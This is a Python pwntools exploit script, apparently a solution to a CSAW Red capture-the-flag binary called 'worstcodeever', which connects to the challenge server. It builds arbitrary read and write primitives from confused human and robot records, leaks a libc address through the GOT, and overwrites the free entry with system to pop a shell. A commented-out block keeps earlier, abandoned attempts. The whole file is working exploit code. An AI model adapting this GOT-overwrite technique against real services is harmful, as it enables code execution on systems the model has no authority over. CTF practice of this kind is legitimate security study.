from pwn import *

LOCAL = False
MAGIC_NUM = 2 ** 31 - 1

context.terminal = ["konsole", "-e"]
context.arch = "amd64"

elf = ELF("./worstcodeever")
if LOCAL:
    libc = ELF("libc.so.6")
    p = process(elf.path)
else:
    libc = ELF("libc-2.27.so")
    p = remote("pwn.red.csaw.io", 5008)

func = "puts"


def add_human(name: bytes, age: int = MAGIC_NUM):
    p.sendlineafter(b">", b"1")
    p.sendline(b"1" + name)
    p.sendline(str(age).encode())


def add_robot(barcode: int = MAGIC_NUM, age: int = MAGIC_NUM):
    p.sendlineafter(b">", b"1")
    p.sendline(b"0")
    p.sendline(str(barcode).encode())
    p.sendline(str(age).encode())


def remove(num: int):
    p.sendlineafter(b">", b"2\n" + str(num).encode())


def edit_robot(num: int, barcode: int, age: int = MAGIC_NUM):
    p.sendlineafter(
        b">",
        b"4\n"
        + str(num).encode()
        + b"\n"
        + str(barcode).encode()
        + b"\n"
        + str(age).encode(),
    )


def edit_human(num: int, name: bytes, age: int = MAGIC_NUM):
    p.sendlineafter(
        b">", b"4\n" + str(num).encode() + b"\n" + name + b"\n" + str(age).encode(),
    )


def show(num: int):
    p.sendlineafter(b">", b"3\n" + str(num).encode())


def arbritary_read(num: int, address: int):
    assert num % 2 == 1
    edit_robot(num, address)
    show(num + 1)
    p.recvuntil(b"Your friend's")
    inp = p.recvline()[:-1]
    byt = inp.split(b"name: ")[1]
    return byt


def arbritary_write(num: int, address: int, data: bytes):
    assert num % 2 == 1
    edit_robot(num, address)
    edit_human(num + 1, data)


def get_libc_base():
    byt = arbritary_read(1, elf.got[func])
    fgets_address = u64(byt.ljust(8, b"\0"))
    libc.address = fgets_address - libc.symbols[func]
    log.info("libc base address " + hex(libc.address))


###CREATE STUFFS
add_human(b"/bin/sh\0")
add_robot()
remove(1)
add_human(b"a")
add_robot()
remove(3)
add_human(b"b")
remove(4)
remove(2)
### CREATED 0: binsh, 1 robot + 2 human and 3 robot + 4 human

get_libc_base()
d = p64(libc.symbols["system"]) + p64(elf.plt["puts"] + 6)
arbritary_write(1, elf.got["free"], d)
#gdb.attach(p)

p.interactive()

## send 2 and - after that
##enjoy shell yay!!!!!!!!


# def cooler_arbritary_write(num: int, address: int, data: int):
#     assert num % 2 == 1
#     assert data < 2 ** 64


# ### point barcode to free
# free_int_str = str(elf.symbols["friend_list"] + 0x8).encode()
# log.info("free at " + hex(elf.symbols["friend_list"] + 0x8))
# p.sendlineafter(b">", b"4\n1\n" + free_int_str + b"\n99")


# free_int_str = p64(elf.got["free"])
# log.info(b"free at " + free_int_str)

# p.sendlineafter(b">", b"4\n2\n" + free_int_str + b"\n99")
# log.info("libc free address " + hex(libc.symbols["free"]))


# free_int_str = str(libc.symbols["system"]).encode()
# log.info("free at " + hex(libc.symbols["system"]) + str(free_int_str))

# p.sendlineafter(b">", b"4\n1\n" + free_int_str + b"\n99")

# p.interactive()


# ### edit name to 'system' address
# final_func = "puts"
# system_add = p64(libc.symbols[final_func])
# log.info("libc system address " + hex(libc.symbols[final_func]))
# log.info(system_add)
# system_add = system_add[:-2]
# if True:
#     p.sendlineafter(b">", b"4")
#     p.sendline(b"2")
#     p.sendline(system_add)  ###note this doesn't work because newline and \n at end
#     p.sendline(b"99")
# else:
#     p.sendlineafter(b">", b"1")
#     p.sendline(b"2" + system_add)
#     p.sendline(b"2")

# p.interactive()
# # gdb.attach(p)


# ### run edit friend on binsh name
# # p.sendlineafter(b">", b"4\n0")

